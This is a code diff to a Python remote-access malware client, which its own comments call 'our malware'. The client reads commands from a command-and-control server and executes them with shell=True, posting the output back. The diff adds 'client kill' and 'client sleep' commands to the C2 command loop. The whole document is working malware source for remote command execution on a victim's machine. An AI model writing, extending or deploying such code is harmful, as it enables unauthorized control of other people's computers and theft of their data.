@@ -56,6 +56,24 @@ while True:
         else:
             post_to_server(getcwd(), CWD_RESPONSE)
 
+    # The "client kill" command will shut down our malware; make sure we have persistance!
+    elif command.startswith("client kill"):
+        post_to_server(f"{client} has been killed.\n")
+        exit()
+
+    # The "client sleep SECONDS" command will silence our malware for a set amount of time
+    elif command.startswith("client sleep "):
+        try:
+            delay = float(command.split()[2])
+            if delay < 0:
+                raise ValueError
+        except (IndexError, ValueError):
+            post_to_server("You must enter in a positive number for the amount of time to sleep in second. \n")
+        else:
+            post_to_server(f"{client} will sleep for {delay} seconds. \n")
+            sleep(delay)
+            post_to_server(f"{client} is now awake. \n")
+
     # Else, run our operating system command and send the output to the c2
     else:
         command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
